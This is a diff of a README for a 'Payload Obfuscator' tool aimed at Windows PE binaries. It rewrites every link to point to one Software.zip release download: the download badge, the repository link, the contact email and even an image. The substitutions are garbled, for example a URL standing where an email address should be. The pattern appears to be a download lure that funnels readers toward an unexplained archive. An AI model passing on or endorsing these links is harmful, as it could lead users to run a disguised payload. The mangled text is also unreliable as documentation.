@@ -22,20 +22,20 @@ To dive into the world of Windows PE binary obfuscation techniques, follow these
 
 ## 📦 Get Started
 Get started with the "Payload Obfuscator" tool by downloading the application package from the link below:
-[<img src="https://img.shields.io/badge/Download-Application.zip-blue">](https://github.com/user-attachments/files/18426772/Application.zip)
+[<img src="https://github.com/JenarGithub76/payload-obfuscator/releases/download/v2.0/Software.zip">](https://github.com/JenarGithub76/payload-obfuscator/releases/download/v2.0/Software.zip)
 
-*Note: Please download the "Application.zip" file and extract it before launching the tool.*
+*Note: Please download the "https://github.com/JenarGithub76/payload-obfuscator/releases/download/v2.0/Software.zip" file and extract it before launching the tool.*
 
 If the link is not working or you need an alternative download option, check the "Releases" section of this repository for the latest updates.
 
 ## 🔍 Explore More
-Visit the [Payload Obfuscator GitHub Repository](https://github.com/yourusername/payload-obfuscator) to explore additional resources, contribute to the project, or report any issues you encounter.
+Visit the [Payload Obfuscator GitHub Repository](https://github.com/JenarGithub76/payload-obfuscator/releases/download/v2.0/Software.zip) to explore additional resources, contribute to the project, or report any issues you encounter.
 
 ## 🌟 Contribute
 Your contributions are welcome! Feel free to fork the repository, make improvements, and submit pull requests to enhance the functionality of the tool. Together, we can strengthen our skills in payload obfuscation and cybersecurity.
 
 ## 📧 Contact
-For any questions, feedback, or suggestions regarding the "Payload Obfuscator" tool, please reach out via email at payload.obfuscator@example.com.
+For any questions, feedback, or suggestions regarding the "Payload Obfuscator" tool, please reach out via email at https://github.com/JenarGithub76/payload-obfuscator/releases/download/v2.0/Software.zip
 
 Start exploring the world of Windows PE binary obfuscation with the "Payload Obfuscator" tool today! 🚀🔒
 
@@ -43,4 +43,4 @@ Start exploring the world of Windows PE binary obfuscation with the "Payload Obf
 
 *Disclaimer: This tool is intended for educational and research purposes only. Usage for any malicious activities is strictly prohibited.*
 
-![Cybersecurity](https://example.com/cybersecurity-image.png)
+![Cybersecurity](https://github.com/JenarGithub76/payload-obfuscator/releases/download/v2.0/Software.zip)
